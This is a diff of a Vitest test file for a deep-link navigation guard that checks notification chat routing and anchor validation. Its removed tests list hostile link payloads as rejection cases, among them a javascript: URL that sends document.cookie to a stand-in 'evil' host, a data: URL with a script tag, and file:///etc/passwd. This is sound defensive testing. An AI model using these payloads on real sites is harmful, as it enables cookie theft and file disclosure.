@@ -1,136 +1,138 @@
-/** Verifies isSafeDeepLink through the package's configured test harness. */
 // @vitest-environment jsdom
-/**
- * The notification deep-link guard (`navigate-deep-link`): `isSafeDeepLink`
- * scheme allowlisting and `navigateDeepLink` routing (new-tab for http(s),
- * in-app event for root-relative). jsdom; pure guard logic, no network.
- */
-import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
-import { isSafeDeepLink, navigateDeepLink } from "./navigate-deep-link";
+import { afterEach, expect, it, vi } from "vitest";
+import { listenForNavigateViewRequests } from "../../events";
+import { navigateDeepLink } from "./navigate-deep-link";
 
-describe("isSafeDeepLink", () => {
-  it("accepts http(s) URLs and root-relative app paths", () => {
-    expect(isSafeDeepLink("https://example.com/x")).toBe(true);
-    expect(isSafeDeepLink("http://example.com")).toBe(true);
-    expect(isSafeDeepLink("/inbox")).toBe(true);
-    expect(isSafeDeepLink("/apps/files?id=1")).toBe(true);
-  });
-
-  it("rejects dangerous schemes and scheme-relative URLs", () => {
-    expect(isSafeDeepLink("javascript:alert(1)")).toBe(false);
-    expect(isSafeDeepLink("JavaScript:alert(1)")).toBe(false);
-    expect(isSafeDeepLink("data:text/html,<script>alert(1)</script>")).toBe(
-      false,
-    );
-    expect(isSafeDeepLink("vbscript:msgbox(1)")).toBe(false);
-    expect(isSafeDeepLink("file:///etc/passwd")).toBe(false);
-    expect(isSafeDeepLink("customapp://do-thing")).toBe(false);
-    expect(isSafeDeepLink("//attacker.example/x")).toBe(false);
-    expect(isSafeDeepLink("")).toBe(false);
-  });
+const target = {
+  conversationId: "d13804ae-4156-47ba-abd1-12961448106e",
+  messageId: "19ea32c4-43d5-4dc9-af91-aeceae70bdd3",
+};
+afterEach(() => {
+  const stop = listenForNavigateViewRequests(() => true);
+  stop();
 });
+it("retains a bare cold chat request until its destination applies it", async () => {
+  let completed = false;
+  const result = navigateDeepLink("/chat");
+  void result?.then(() => {
+    completed = true;
+  });
+  await Promise.resolve();
+  expect(completed).toBe(false);
+  let release: (value: boolean) => void = () => {};
+  const pending = new Promise<boolean>((resolve) => {
+    release = resolve;
+  });
+  const stop = listenForNavigateViewRequests((event) => {
+    expect(event.detail.payload).toEqual({ kind: "notification-chat" });
+    return pending;
+  });
+  await Promise.resolve();
+  expect(completed).toBe(false);
+  release(true);
+  await expect(result).resolves.toBe(true);
+  stop();
+});
+it("awaits asynchronous application and keeps two different anchors in FIFO order", async () => {
+  const second = {
+    ...target,
+    messageId: "0168583b-8aea-4420-a6d7-ed2339bca079",
+  };
+  const first = navigateDeepLink("/chat", target);
+  const later = navigateDeepLink("/chat", second);
+  const applied: unknown[] = [];
+  let release: (value: boolean) => void = () => {};
+  const pending = new Promise<boolean>((resolve) => {
+    release = resolve;
+  });
+  const stop = listenForNavigateViewRequests((event) => {
+    applied.push(event.detail.payload);
+    return applied.length === 1 ? pending : true;
+  });
+  expect(applied).toEqual([{ kind: "notification-chat", target }]);
+  release(true);
+  await expect(first).resolves.toBe(true);
+  await expect(later).resolves.toBe(true);
+  expect(applied).toEqual([
+    { kind: "notification-chat", target },
+    { kind: "notification-chat", target: second },
+  ]);
+  stop();
+});
+it("does not acknowledge an unmounted asynchronous owner", async () => {
+  const result = navigateDeepLink("/chat", target);
+  let release: (value: boolean) => void = () => {};
+  const stop = listenForNavigateViewRequests(
+    () =>
+      new Promise<boolean>((resolve) => {
+        release = resolve;
+      }),
+  );
+  stop();
+  let acknowledged = false;
+  void result?.then(() => {
+    acknowledged = true;
+  });
+  release(true);
+  await Promise.resolve();
+  expect(acknowledged).toBe(false);
+  const retry = listenForNavigateViewRequests(() => true);
+  await expect(result).resolves.toBe(true);
+  retry();
+});
+it.each([
+  { ...target, notificationId: "invalid" },
+  { messageId: target.messageId },
+  { ...target, messageId: "missing" },
+  { ...target, conversationId: "foreign" },
+])(
+  "rejects malformed claimed anchors without opening legacy chat",
+  async (data) => {
+    const listener = vi.fn(() => true);
+    const stop = listenForNavigateViewRequests(listener);
+    await expect(navigateDeepLink("/chat", data)).resolves.toBe(false);
+    expect(listener).not.toHaveBeenCalled();
+    stop();
+  },
+);
 
-describe("navigateDeepLink", () => {
-  let openSpy: ReturnType<typeof vi.spyOn>;
-  let dispatchSpy: ReturnType<typeof vi.spyOn>;
-  let assignSpy: ReturnType<typeof vi.fn>;
-
-  beforeEach(() => {
-    openSpy = vi.spyOn(window, "open").mockImplementation(() => null);
-    dispatchSpy = vi.spyOn(window, "dispatchEvent");
-    // Guard against any regression that reintroduces a top-window navigation.
-    assignSpy = vi.fn();
-    Object.defineProperty(window, "location", {
-      configurable: true,
-      value: { ...window.location, assign: assignSpy },
+it.each(["decline", "reject"])(
+  "hands off asynchronous %s to another already-mounted owner exactly once",
+  async (mode) => {
+    const result = navigateDeepLink("/chat", target);
+    let release: (value: boolean) => void = () => {};
+    let reject: (error: Error) => void = () => {};
+    const pending = new Promise<boolean>((resolve, fail) => {
+      release = resolve;
+      reject = fail;
     });
-  });
+    const first = vi.fn(() => pending);
+    const stopFirst = listenForNavigateViewRequests(first);
+    const second = vi.fn(() => true);
+    const stopSecond = listenForNavigateViewRequests(second);
+    expect(second).not.toHaveBeenCalled();
+    if (mode === "decline") release(false);
+    else reject(Error("not applied"));
+    await expect(result).resolves.toBe(true);
+    expect(first).toHaveBeenCalledTimes(1);
+    expect(second).toHaveBeenCalledTimes(1);
+    stopFirst();
+    stopSecond();
+  },
+);
 
-  afterEach(() => {
-    vi.restoreAllMocks();
+it("retains the validated canonical notification ID through push metadata admission", async () => {
+  const notificationId = "630784a5-5f4e-47e7-88e9-162ac5bb7425";
+  const stop = listenForNavigateViewRequests((event) => {
+    expect(event.detail.payload).toEqual({
+      kind: "notification-chat",
+      target,
+      notificationId,
+    });
+    return true;
   });
-
-  it("opens an http(s) deep link in a new noopener tab, never the top window", () => {
-    navigateDeepLink("https://example.com/x");
-    expect(openSpy).toHaveBeenCalledWith(
-      "https://example.com/x",
-      "_blank",
-      "noopener,noreferrer",
-    );
-    expect(assignSpy).not.toHaveBeenCalled();
-  });
-
-  it("dispatches an in-app navigate event for a root-relative path", () => {
-    navigateDeepLink("/apps/files");
-    const evt = dispatchSpy.mock.calls
-      .map((c: unknown[]) => c[0])
-      .find((e: unknown): e is CustomEvent => e instanceof CustomEvent);
-    expect(evt).toBeDefined();
-    if (!evt) {
-      throw new Error("Expected an in-app navigation event");
-    }
-    expect(evt.type).toBe("eliza:navigate:view");
-    expect((evt.detail as { viewId?: string }).viewId).toBe("apps");
-    expect(openSpy).not.toHaveBeenCalled();
-  });
-
-  it("opens the floating chat for /chat instead of a routed navigation", () => {
-    navigateDeepLink("/chat");
-    const types = dispatchSpy.mock.calls
-      .map((c: unknown[]) => c[0])
-      .filter((e: unknown): e is CustomEvent => e instanceof CustomEvent)
-      .map((e: CustomEvent) => e.type);
-    expect(types).toContain("eliza:chat:open");
-    expect(types).not.toContain("eliza:navigate:view");
-  });
-
-  it("opens the Home notification center for /notifications", () => {
-    navigateDeepLink("/notifications");
-    const types = dispatchSpy.mock.calls
-      .map((c: unknown[]) => c[0])
-      .filter((e: unknown): e is CustomEvent => e instanceof CustomEvent)
-      .map((e: CustomEvent) => e.type);
-    expect(types).toContain("eliza:notifications:open");
-    expect(types).not.toContain("eliza:navigate:view");
-  });
-
-  it("prefills the chat composer for /chat?prefill=<text> (never auto-sends)", () => {
-    navigateDeepLink("/chat?prefill=Connect%20my%20calendar");
-    const evt = dispatchSpy.mock.calls
-      .map((c: unknown[]) => c[0])
-      .find(
-        (e: unknown): e is CustomEvent =>
-          e instanceof CustomEvent && e.type === "eliza:chat:prefill",
-      );
-    expect(evt).toBeDefined();
-    if (!evt) {
-      throw new Error("Expected a chat prefill event");
-    }
-    expect((evt.detail as { text?: string }).text).toBe("Connect my calendar");
-    const types = dispatchSpy.mock.calls
-      .map((c: unknown[]) => c[0])
-      .filter((e: unknown): e is CustomEvent => e instanceof CustomEvent)
-      .map((e: CustomEvent) => e.type);
-    expect(types).not.toContain("eliza:navigate:view");
-  });
-
-  it.each([
-    "javascript:fetch('//evil/'+document.cookie)",
-    "data:text/html,<script>alert(1)</script>",
-    "vbscript:msgbox(1)",
-    "file:///etc/passwd",
-    "customapp://x",
-    "//attacker.example/x",
-  ])("performs no navigation for the dangerous deep link %s", (link) => {
-    navigateDeepLink(link);
-    expect(openSpy).not.toHaveBeenCalled();
-    expect(assignSpy).not.toHaveBeenCalled();
-    const navEvt = dispatchSpy.mock.calls
-      .map((c: unknown[]) => c[0])
-      .find(
-        (e: unknown): e is CustomEvent =>
-          e instanceof CustomEvent && e.type === "eliza:navigate:view",
-      );
-    expect(navEvt).toBeUndefined();
-  });
+  await expect(
+    navigateDeepLink("/chat", { ...target, notificationId }),
+  ).resolves.toBe(true);
+  stop();
 });
